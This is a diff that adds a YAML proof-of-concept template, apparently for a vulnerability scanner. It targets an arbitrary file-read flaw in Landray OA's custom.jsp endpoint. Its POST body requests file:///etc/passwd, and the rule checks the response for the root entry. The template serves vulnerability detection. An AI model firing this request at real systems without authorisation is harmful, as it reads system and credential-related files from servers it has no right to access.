@@ -1,0 +1,11 @@
+name: poc-yaml-landray-oa-custom-jsp-fileread
+rules:
+  - method: POST
+    path: /sys/ui/extend/varkind/custom.jsp
+    body: var={"body":{"file":"file:///etc/passwd"}}
+    expression: |
+      response.status == 200 && "root:[x*]:0:0:".bmatches(response.body)
+detail:
+  author: B1anda0(https://github.com/B1anda0)
+  links:
+    - https://mp.weixin.qq.com/s/TkUZXKgfEOVqoHKBr3kNdw
